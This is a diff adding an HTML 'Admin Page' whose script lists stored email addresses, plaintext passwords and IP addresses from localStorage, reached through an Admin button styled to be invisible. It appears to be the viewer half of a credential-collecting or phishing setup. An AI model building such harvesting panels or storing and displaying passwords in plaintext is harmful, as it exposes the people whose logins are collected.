@@ -1,0 +1,88 @@
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Page</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background-color: #F0F4F8;
+            margin: 0;
+            font-family: 'Roboto', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+        }
+
+        .container {
+            background-color: white;
+            width: 80%;
+            max-width: 800px;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            text-align: left;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: bold;
+            margin: 0;
+            margin-bottom: 20px;
+            color: #323232;
+        }
+
+        .data-list {
+            list-style-type: none;
+            padding: 0;
+        }
+
+        .data-list li {
+            margin-bottom: 20px;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+
+        .admin-button {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background-color: #F0F4F8;
+            border: none;
+            color: transparent;
+            cursor: pointer;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Admin Page - All Data</h1>
+        <ul class="data-list" id="data-list"></ul>
+    </div>
+
+    <button class="admin-button" onclick="goToIndex()">Admin</button>
+
+    <script>
+        window.onload = function() {
+            var storedData = JSON.parse(localStorage.getItem('storedData')) || [];
+            var dataList = document.getElementById('data-list');
+
+            storedData.forEach(function(item) {
+                var listItem = document.createElement('li');
+                listItem.textContent = `Email: ${item.email}, Password: ${item.password}, IP: ${item.ip}`;
+                dataList.appendChild(listItem);
+            });
+        };
+
+        function goToIndex() {
+            window.location.href = 'index.html';
+        }
+    </script>
+</body>
+</html>
